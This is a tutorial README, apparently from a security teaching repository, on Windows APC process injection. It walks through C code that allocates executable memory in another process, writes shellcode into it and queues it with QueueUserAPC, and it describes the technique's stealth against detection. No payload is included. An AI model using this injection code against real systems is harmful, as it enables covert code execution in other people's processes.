# APC Injection (Asynchronous Procedure Call Injection)

This folder demonstrates **APC injection** - a process injection technique that queues code execution on existing threads rather than creating new ones.

**Important Disclaimer**: This code is for educational purposes only on systems you own or have explicit authorization to test. Unauthorized injection is illegal.

---

## What Is APC Injection?

APC (Asynchronous Procedure Call) injection shares similarities with thread hijacking but operates differently:

1. **Enumerate Threads** – Use `CreateToolhelp32Snapshot()` to enumerate threads in the target process
2. **Select Thread** – Find a valid thread ID from the target process
3. **Allocate Memory** – Use `VirtualAllocEx()` to allocate executable memory in the target process
4. **Write Shellcode** – Use `WriteProcessMemory()` to copy shellcode to the allocated memory
5. **Get Thread Handle** – Use `OpenThread()` to obtain a handle to the target thread
6. **Queue APC** – Use `QueueUserAPC()` to queue the shellcode for asynchronous execution
7. **Wait for Alertable State** – The shellcode executes when the thread enters an alertable state

### The Alertable State Requirement

The critical difference from other injection techniques: **the thread must enter an alertable state** for the queued APC to execute. An alertable state occurs when a thread calls:

- `Sleep()` / `SleepEx()`
- `WaitForSingleObject()`
- `WaitForMultipleObjects()`
- `MsgWaitForMultipleObjects()`
- `SignalObjectAndWait()`

When the thread calls one of these APIs, the APC callback executes before the API returns.

### In This Folder

The example demonstrates **remote APC injection** - injecting shellcode into a different process via APC on an existing thread.

**Flow:**
```
Injector Process (APC-Injection.exe)
    │
    ├─ CreateToolhelp32Snapshot() → Get all threads
    │
    ├─ Thread32First/Next() → Find thread in target PID
    │
    ├─ OpenProcess() → Get handle to target
    │
    ├─ VirtualAllocEx() → Allocate memory in target
    │
    ├─ WriteProcessMemory() → Write shellcode to target
    │
    ├─ OpenThread() → Get handle to target thread
    │
    └─ QueueUserAPC() → Queue shellcode for execution
        │
        └─ Target Process
            │
            ├─ Thread enters alertable state (Sleep, Wait, etc.)
            │
            └─ Shellcode executes via APC callback
```

---

## Code Breakdown

### Thread Enumeration (Thread Walking)

```c
DWORD threadId = 0;
HANDLE hSnapshot = CreateToolhelp32Snapshot(
    TH32CS_SNAPTHREAD,  // Snapshot all threads in the system
    0                   // Include all processes
);

THREADENTRY32 te = {0};
te.dwSize = sizeof(te);

Thread32First(hSnapshot, &te);

do {
    if (te.th32OwnerProcessID == pid) {  // Match target process
        threadId = te.th32ThreadID;       // Store thread ID
        break;
    }
    te.dwSize = sizeof(te);
} while (Thread32Next(hSnapshot, &te));
```

Iterates through all system threads and finds one belonging to the target process. The first valid thread is selected as the APC target.

### Opening the Target Process

```c
HANDLE hProcess = OpenProcess(
    PROCESS_VM_OPERATION |  // Required for VirtualAllocEx
    PROCESS_VM_WRITE,       // Required for WriteProcessMemory
    FALSE,
    pid
);
```

Obtains a handle to the target process with necessary permissions.

### Memory Allocation in Target

```c
LPVOID HandleMemory = VirtualAllocEx(
    hProcess,                   // Target process
    NULL,                       // Preferred address (OS chooses)
    sizeof(shellcode),          // Size to allocate
    MEM_COMMIT | MEM_RESERVE,   // Allocate and commit pages
    PAGE_EXECUTE_READWRITE      // Make executable
);
```

Allocates executable memory in the target process to hold shellcode.

### Writing Shellcode

```c
SIZE_T bytesWritten = 0;
BOOL RESULT = WriteProcessMemory(
    hProcess,               // Target process
    HandleMemory,           // Remote address in target
    shellcode,              // Shellcode buffer (local)
    sizeof(shellcode),      // Size to copy
    &bytesWritten
);
```

Copies shellcode bytes from the injector process to the target process memory.

### Opening the Target Thread

```c
HANDLE hThread = OpenThread(
    THREAD_SET_CONTEXT,     // Required for APC operations
    FALSE,
    threadId                // Thread ID from enumeration
);
```

Obtains a handle to the enumerated thread in the target process.

### Queuing the APC

```c
DWORD apcResult = QueueUserAPC(
    (PAPCFUNC)HandleMemory,  // Function pointer (shellcode address)
    hThread,                 // Thread to receive APC
    0                        // Optional parameter (unused here)
);
```

Queues the shellcode for asynchronous execution. The shellcode runs when the thread enters an alertable state.

### Cleanup

```c
CloseHandle(hThread);      // Close thread handle
CloseHandle(hProcess);     // Close process handle
CloseHandle(hSnapshot);    // Close snapshot handle
```

Releases acquired handles and cleanup resources.

---

## Prerequisites

### System Requirements
- Windows 10/11 (examples target modern Windows)
- Administrator privileges (often required)
- Target process with accessible thread
- Isolated test environment **strongly recommended**

### Development Tools
- **C/C++ Compiler:** MSVC (Visual Studio) or MinGW-w64
- **Debugger:** WinDbg, x64dbg, or Visual Studio Debugger (optional)
- **Process Tools:** Process Explorer for thread enumeration

### Knowledge Requirements
- Understanding of Windows thread enumeration (CreateToolhelp32Snapshot)
- Understanding of APC concepts and alertable states
- Understanding of Process IDs and Thread IDs
- Understanding of shellcode (position-independent machine code)

---

## Running

### Step 1: Create an Alertable Target Process

The target process **must be in an alertable state** for the APC to execute. Use the provided `Alertable-Process.exe`:

```powershell
gcc -o Alertable-Process.exe Alertable-Process.c
.\Alertable-Process.exe
# Output: Target process PID: 1234
```

### Step 2: Run the APC Injector

In another terminal:

```powershell
.\APC-Injection.exe 1234
```

### Expected Output

**From Alertable-Process.exe:**
```
Target process PID: 1234
Process is now in alertable state (sleeping)...
[APC executes here - shellcode runs]
```

**From APC-Injection.exe:**
```
Target PID: 1234
Found thread ID: 5678
Successfully opened handle to process with PID 1234: 0x00000000000001F4
Memory allocated successfully at address: 0x0000000002A40000
Wrote 5280 bytes to allocated memory.
Successfully opened handle to thread with TID 5678: 0x00000000000001FC
APC queued successfully to thread ID 5678.
```

---

## Generating Shellcode

The `shellcode` array in the code must be filled with actual machine code bytes. Use **Donut** (documented in [../Shellcode/README.md](../Shellcode/README.md)) to generate shellcode and convert to hex format.

---

## How It Works: Step-by-Step

```
┌──────────────────────────────────────────────┐
│ Injector Process Starts                      │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ CreateToolhelp32Snapshot()                   │
│ ├─ Take snapshot of all system threads       │
│ └─ Enumerate to find target's threads        │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Thread32First/Thread32Next()                 │
│ ├─ Iterate through all threads               │
│ ├─ Match th32OwnerProcessID == target PID    │
│ └─ Store thread ID (e.g., 5678)              │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ OpenProcess()                                │
│ ├─ Open target process handle                │
│ └─ Get PROCESS_VM_OPERATION | PROCESS_VM_WR │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ VirtualAllocEx()                             │
│ ├─ Allocate memory in target process         │
│ └─ Address: 0x0000000002A40000              │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ WriteProcessMemory()                         │
│ ├─ Copy shellcode to target memory           │
│ └─ 5280 bytes written                        │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ OpenThread()                                 │
│ ├─ Get handle to found thread (ID: 5678)    │
│ └─ Requires THREAD_SET_CONTEXT access       │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ QueueUserAPC()                               │
│ ├─ Queue shellcode (0x0000000002A40000)     │
│ ├─ to thread (5678)                          │
│ └─ APC added to thread's APC queue           │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Return to Injector (Injection Complete)      │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌───────────────────────────────────────────────────┐
│ Target Process Thread Queue Check                 │
│ ├─ Thread continues executing normally            │
│ └─ APC waits in queue...                          │
└───────────┬───────────────────────────────────────┘
            │
            ▼
┌───────────────────────────────────────────────────┐
│ Thread Enters Alertable State                     │
│ ├─ Calls Sleep(), WaitForSingleObject(), etc.    │
│ │                                                 │
│ └─ Windows: "Check APC queue before waiting"     │
└───────────┬───────────────────────────────────────┘
            │
            ▼
┌───────────────────────────────────────────────────┐
│ APC Execution                                     │
│ ├─ Call APC function (shellcode address)         │
│ ├─ Execute shellcode in target's context         │
│ └─ Shellcode payload runs (MessageBox, etc.)     │
└───────────┬───────────────────────────────────────┘
            │
            ▼
┌───────────────────────────────────────────────────┐
│ APC Completes                                     │
│ ├─ Return from APC callback                      │
│ └─ Thread continues with original API call       │
└───────────┬───────────────────────────────────────┘
            │
            ▼
┌───────────────────────────────────────────────────┐
│ Clean Up                                          │
│ ├─ CloseHandle(hThread)                           │
│ ├─ CloseHandle(hProcess)                          │
│ └─ CloseHandle(hSnapshot)                         │
└───────────────────────────────────────────────────┘
```

---

## Advantages of APC Injection

✓ **No new threads** – Reuses existing threads instead of creating visible artifacts
✓ **Stealthy** – Less obvious than `CreateRemoteThread()` calls
✓ **Works across processes** – Can inject into different processes
✓ **Reliable execution** – Once queued, APC reliably executes when thread is alertable

---

## Limitations and Critical Risks

✗ **Alertable state requirement** – Shellcode only executes if/when the target thread calls an alertable API
✗ **Timing uncertainty** – No guarantee selected thread will become alertable in reasonable timeframe
✗ **Limited thread selection** – Enumerating and testing all threads risks process crash
✗ **Access control** – DACL on target process may deny thread access
✗ **Architecture specific** – Different considerations for 32-bit vs 64-bit processes

### The Alertable State Problem

Unlike thread hijacking (which forces execution immediately) or remote thread creation (which guarantees execution), APC injection depends on **thread behavior**:

- **Best case:** Target thread calls a wait API soon after APC queued → shellcode executes
- **Worst case:** Target thread never calls alertable API → shellcode never executes

**Why queuing APCs on multiple threads is dangerous:**
- Queuing APC on every thread increases likelihood of execution but risks crashing the process
- Each APC callback execution has potential for failures, memory corruption, or stack overflow
- Multiple simultaneously-executing APCs in the same process can cause stability issues
- EDR/security software may detect multiple APC operations as anomalous

---

## Legal and Ethical Considerations

**Authorization Required:**
- Only use on systems you own
- Never test on systems without explicit written permission
- Works in authorized penetration testing scenarios only

**Responsible Disclosure:**
- Report findings through proper channels
- Give organizations time to patch
- Follow your organization's security policies

**Legal Implications:**
- Unauthorized code injection is illegal (Computer Fraud and Abuse Act in US)
- Similar laws exist in other jurisdictions
- Violations can result in criminal charges

---

## References

- [CreateToolhelp32Snapshot Documentation](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
- [Thread32First Documentation](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first)
- [OpenThread Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)
- [QueueUserAPC Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueapcthread)
- [VirtualAllocEx Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [Alertable Wait State](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex)
- [Windows Internals](https://learn.microsoft.com/en-us/sysinternals/)

---

## Disclaimer

This code and documentation are provided for educational purposes on authorized systems only. Unauthorized process injection is illegal and violates computer fraud laws. You are solely responsible for compliance with applicable laws and organizational policies.
